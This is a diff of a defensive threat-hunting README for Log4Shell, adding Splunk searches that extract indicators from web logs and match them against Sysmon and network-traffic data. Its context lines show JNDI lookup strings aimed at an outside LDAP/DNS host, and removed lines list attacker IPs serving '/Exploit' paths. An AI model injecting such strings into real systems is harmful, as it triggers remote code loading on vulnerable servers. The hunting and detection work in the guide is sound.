@@ -4,9 +4,11 @@ As the log4j "sawdust" settles, many Organizations may want to take further proa
 
 This resource takes a threat hunting approach to identifying evidence of successful exploitation of this vulnerability. This is not intended to solely replace detection of attacks on the network; a role that is ideally primarily fulfilled by existing security products, but instead takes advantage of the "noisy" nature of the attack to systematically hunt for successful outcomes of the attempted attacks against vulnerable assets across an environment.
 
-We are intentionally not using security control alerts for our initial scope our initial investigation. These alerts should not be ignored - the records these alerts provide can be used if the alert contains the URI, User-AgentStrings, or other fields mentioned later that may contain the attack. However, keep in mind that Threat Hunting is most valuable when it identifies true threats that the SOC has not already triaged. Therefore data from things like NTAs, NG-Firewall HTTP logs or Proxys, or even Web Server logs (which is what we use here for examples) will be more valuable than IPS alerts Log4j attack logs.
+Security Vendors worked hard to keep up with the evolving threats, but there were [many bypasses](#bypass-examples) to the developed prevention and detection signatures and security vendors had to consistently adapt with [new signatures](#example:-palo-alto) as adversaries discovered new ways to bypass in place detections. This meant that even companies with the most recent signatures were very likely targeted attacks that were not detected.  
 
-Also, consider that SOC triages alerts from security controls. Their deliverable is a determination on whether a notable event that has been surfaced requires additional escalation or not. A Threat Hunter delivers a compromise assessment:
+Therefore, we are intentionally not using Security alerts for our initial scope. These alerts should *not* be ignored and can even been included in the hunt if they contain records of the URL, User-AgentStrings, or other [fields mentioned later](#locations-to-consider-checking) that may contain the attack. However, keep in mind that Threat Hunting is most valuable when it identifies true threats that the SOC has not already triaged. Therefore data from things like NTAs, NG-Firewall HTTP logs or Proxys, or even Web Server logs (which is what we use here for examples) will be more valuable than IPS alerts Log4j attack logs.
+
+Also, consider that SOC primarily triages alerts from security controls. Their deliverable is a determination on whether a notable event that has been surfaced requires additional escalation or not. A Threat Hunter delivers a compromise assessment:
 
 1. I am reasonably certain the system/environment is safe​
 2. I am reasonably certain the system/environment is compromised​
@@ -70,7 +72,7 @@ regular expression example: `\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A
 ### Scoping out a Query
 Scope all relevant logs using the `${jndi\:` string.
 
-  ### Locations to consider checking
+#### Locations to consider checking
   - username and passwords
   - input fields
   - email addresses
@@ -156,8 +158,13 @@ ${jndi:ldap://caffeinatedsheep.com/a
 ${jndi:dns://caffeinatedsheep.com/a
 ```
 
-Just as Vulnerability Scanning vendors were coming out with new packages to detect places where Log4j could be found that they had missed, Detection Vendors to were releasing new signatures to try to detect the attack when it occurred with means to bypass current detection signatures. For example, we can consider PaloAlto - a great security detection producer who created several packages related to Log4j vulnerbaility discoveries.
+#### Bypass examples
+---------------
 
+Just as Vulnerability Scanning vendors were coming out with new packages to detect places where Log4j could be found that they had missed, Detection Vendors to were releasing new signatures to try to detect the attack when it occurred with means to bypass current detection signatures. For example, we can consider PaloAlto - a great security detection producer who created several packages related to Log4j vulnerabilities discoveries.
+
+
+#### Example: Palo Alto
 | Date | ID | Threat Name | CVE | Severity |
 |---|---|---|---|---|
 | 9-Dec | 91991 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
@@ -198,20 +205,32 @@ To do ths, we will use the regular expression provided in the hunt outline.
 #### Network Extraction:
 `:(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`
 
-In Splunk this would look like: ` ... search | rex field=foo ":(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})\/(?<threat_content>(?:[[:alnum:]]|\.){1,})))"
-| fields - foo _time`
+In Splunk this would look like:
+```
+ ... search
+  | rex field=foo ":(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})\/(?<threat_content>(?:[[:alnum:]]|\.){1,})))"
+  | fields - foo _time
+  | table elastic_source threat threat_host threat_port threat_content
+  | outputlookup log4j-net-threats.csv
+```
+
 
 <h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/splunk_net_extract.png" width="700px"></h1>
 
 #### Base64
 `\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`
 
-In Splunk this would look like: ` ... search | rex field=foo ":(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})\/(?<threat_content>(?:[[:alnum:]]|\.){1,})))"
-| fields - foo _time`
+In Splunk this would look like:
+```
+ ... search
+  | rex field=foo ":(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})\/(?<threat_content>(?:[[:alnum:]]|\.){1,})))"
+  | fields - foo _time
+  | outputlookup log4j-base64-threats.csv
+```
 
 <h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/splunk_base64_extract.png" width="700px"></h1>
 
-Run these regular expressions in your search. While Splunk has a built in command to run regular expression on search results I don't know of an easy way to do this in Kibana. I would just pull the data from the Elastic API and then use another Regular expression tool.
+Note that in both searches we are outputting the results to a csv that we can use to run against our endpoint and network resources later. While Splunk has a built in command to run regular expression on search results I don't know of an easy way to do this in Kibana. I would just pull the data from the Elastic API and then use another Regular expression tool.
 
 At this point I don't have an easy to use tool to run this regular expression on that can output the multiple capture groups well.
 
@@ -223,14 +242,10 @@ Alternative Options:
 - **grep -Po** - Can print only matches; however, only prints the first match. Regex would need to be rewritten as seperate expressions for each match.
 
 `$ cat ./elastic_export.txt | grep -Po1 ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}'
-://90.84.178.188:1389/Exploit}
-://5.101.118.127:1389/Exploit}
-://31.131.16.127:1389/Exploit}
-://31.131.16.127:1389/Exploit}
 `
 - **sed -rn** uses different flavor of regex and current syntax will not work.
 
-`sed -rn ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}' ./elastic_export.txt
+`sed -rn ':(?:\/){1,2}(?<threat>(?<threat_host>(?:[A-Za-z0-9]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[A-Za-z0-9]|\.){1,})))\/(?<threat_record>[A-Za-z0-9]{1,})}' ./tomcat_honeypot_messages_export.txt
 sed: -e expression #1, char 12: unexpected `}'`
 
 I will research or write a Python script later to accomplish this.
@@ -245,13 +260,55 @@ Notice in the following example there are several types of output. Simple IPs ex
 <h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/terminal_base64.png" width="700px"></h1>
 
 
-### Successful Attack Identification NetConnect
-
-
 ### Successful Attack Identification Base64
+Now that we have a base64 string we can do two things: search for the string in endpoing data (process execution logs that contain command line string) and we can take the extracted network indicators form the base64 commands and use those against our netflow logs.
+
+Endpoint Data:
+Search for the base64 strings against your NetFlow data. Bellow is an example with Sysmon.
+
+
+```
+index=homelab sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 CommandLine=*
+    [| inputlookup log4j-base64-threats.csv]
+| table _time CommandLine host
+```
+
+All of the results will indicate successful exploitation and should be stored somewhere for additional analysis.
+
+### Successful Attack Identification NetConnect
+From both hunts we should have generated lists of IPs that adversaries attempted to instruct our servers to communicate to.
+
+*Network IP Addresses*
+```
+| tstats summariesonly=t count from datamodel=Network_Traffic where * by All_Traffic.dest All_Traffic.src All_Traffic.dest_port  All_Traffic.action All_Traffic.vendor_product
+| search
+    [| inputlookup log4j-net-threats.csv
+    | rename threat_host as All_Traffic.dest
+    | fields All_Traffic.dest ]
+| sort - count
+| eval threat_host = 'All_Traffic.dest'
+| lookup log4j-net-threats.csv threat_host as threat_host
+```
+
+*Network Hostnames*
+```
+| tstats summariesonly=t count from datamodel=Web by Web.dest Web.src Web.dest_port Web.action Web.vendor_product Web.url
+| search
+    [| inputlookup log4j-net-threats.csv  
+    | rename threat_host as Web.url
+    | fields Web.url ]
+| sort - count
+| eval threat_host = 'Web.url'
+| lookup log4j-net-threats.csv  threat_host as threat_host
+```
+
+<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/splunk-net-match.png" width="700px"></h1>
+
 
 ### Analyze Results
 Review the results and contain, remediate, and escalate where necessary.
+
+Any instances where endpoint data reveals execution of base64 commands or devices reached out to IP addresses on ports as directed by the attacks indicate a successful attack that was launched against your network. These events need to be escalated to an Incident Response process and investigated.
 
 ## FQ&A and General Info
 
